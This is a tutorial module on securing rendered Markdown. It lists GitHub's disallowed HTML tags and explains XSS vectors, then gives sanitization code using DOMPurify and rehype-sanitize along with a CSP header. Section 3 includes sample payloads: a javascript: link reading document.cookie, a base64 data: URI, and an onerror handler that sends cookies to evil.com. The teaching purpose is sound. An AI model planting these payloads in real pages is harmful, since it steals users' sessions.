# Module 10: Security and Safe HTML Processing

> **Scope**: Understanding Markdown security implications, CommonMark raw HTML behavior, GitHub's disallowed HTML tags, XSS attack vectors in user-generated Markdown, and production sanitization pipelines using DOMPurify and rehype-sanitize.

---

## 1. Why Markdown Security Matters

Markdown is designed to allow raw HTML as a fallback. However, when an application renders user-supplied Markdown (e.g., in issue comments, wiki posts, blog comments, or chat widgets), untrusted HTML and malicious URLs can lead to **Cross-Site Scripting (XSS)** vulnerabilities, credential theft, session hijacking, or malicious phishing redirects.

---

## 2. GitHub Disallowed Raw HTML Elements

Under the GitHub Flavored Markdown (GFM) specification, GitHub filters and strips raw HTML tags that pose high security risks:

```html
<title>
<textarea>
<style>
<xmp>
<iframe>
<noembed>
<noframes>
<script>
<plaintext>
<form>
<input>
<base>
```

When any of these elements appear in GFM, GitHub automatically escapes them or discards them entirely:
- `<script>alert(1)</script>` is rendered as harmless literal text: `&lt;script&gt;alert(1)&lt;/script&gt;`.

---

## 3. Common Markdown XSS Attack Vectors

### 1. The `javascript:` URI Scheme
Attackers often disguise executable JavaScript inside Markdown hyperlink targets:

```markdown
<!-- Malicious Markdown -->
[Claim your reward here!](javascript:alert(document.cookie))
```

A vulnerable parser blindly translates this into:
```html
<a href="javascript:alert(document.cookie)">Claim your reward here!</a>
```
Clicking the link executes the JavaScript in the victim's session.

### 2. Malicious HTML Event Handlers
Attackers embed inline event listeners on allowed tags (like `<img>` or `<a>`):

```html
<img src="invalid-image-url" onerror="fetch('https://evil.com/steal?c=' + document.cookie)" />
```

### 3. Data URIs
```markdown
[Download Document](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
```

---

## 4. Building a Safe Rendering Pipeline

Never pass the raw output of a Markdown compiler directly into `innerHTML` or `dangerouslySetInnerHTML`. Always run the output through a dedicated HTML sanitizer.

### Approach A: Using `DOMPurify` (Recommended for Client & Node.js)

```typescript
import { marked } from "marked";
import DOMPurify from "isomorphic-dompurify";

export function renderSafeMarkdown(untrustedMarkdown: string): string {
  // 1. Compile markdown to raw HTML
  const rawHtml = marked.parse(untrustedMarkdown, {
    async: false,
    gfm: true
  }) as string;

  // 2. Sanitize HTML, stripping scripts, iframes, and dangerous handlers
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: [
      "p", "b", "i", "em", "strong", "a", "h1", "h2", "h3", "h4", "h5", "h6",
      "ul", "ol", "li", "blockquote", "code", "pre", "table", "thead", "tbody",
      "tr", "th", "td", "hr", "br", "img", "details", "summary", "del"
    ],
    ALLOWED_ATTR: ["href", "src", "alt", "title", "class", "align", "open"],
    ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  });

  return cleanHtml;
}
```

### Approach B: Using Unified / Remark / Rehype Pipeline

```typescript
import { unified } from "unified";
import remarkParse from "remark-parse";
import remarkGfm from "remark-gfm";
import remarkRehype from "remark-rehype";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import rehypeStringify from "rehype-stringify";

export async function processMarkdownSecurely(content: string): Promise<string> {
  const file = await unified()
    .use(remarkParse)               // Parse Markdown AST
    .use(remarkGfm)                 // Support GitHub Flavored Markdown
    .use(remarkRehype)              // Convert to HTML AST
    .use(rehypeSanitize, defaultSchema) // Apply strict security whitelist
    .use(rehypeStringify)           // Serialize to safe HTML string
    .process(content);

  return String(file);
}
```

---

## 5. Defense-in-Depth: Content Security Policy (CSP)

Even with sanitizers, set strict Content Security Policy HTTP headers to prevent code execution if any malicious tag slips through:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';
```

---

## 6. Security Checklist for Markdown Applications

- [ ] Disallow `javascript:`, `vbscript:`, and `data:` schemes in links and images.
- [ ] Add `rel="noopener noreferrer"` and `target="_blank"` to all external links.
- [ ] Strip or escape all HTML `<script>`, `<style>`, `<iframe>`, and `<form>` tags.
- [ ] Sanitize compiled HTML using `DOMPurify` or `rehype-sanitize`.
- [ ] Enforce a strict Content Security Policy on pages displaying user Markdown.
